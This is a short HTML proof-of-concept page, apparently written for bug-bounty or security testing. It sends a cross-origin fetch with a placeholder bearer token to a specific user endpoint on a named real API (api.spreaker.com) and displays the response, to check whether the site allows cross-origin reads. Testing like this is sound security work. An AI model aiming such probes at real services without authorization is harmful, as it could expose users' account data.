<!DOCTYPE html>
<html>
<body>
<h2>CORS PoC Test</h2>

<button onclick="test()">Run PoC</button>

<pre id="out"></pre>

<script>
function test() {
    fetch("https://api.spreaker.com/v2/users/19021225?c=en_US", {
        method: "GET",
        headers: {
            "Authorization": "Bearer YOUR_TOKEN_HERE"
        }
    })
    .then(res => res.text())
    .then(data => {
        document.getElementById("out").innerText = data;
        console.log(data);
    })
    .catch(err => {
        console.log("Error:", err);
    });
}
</script>

</body>
</html>
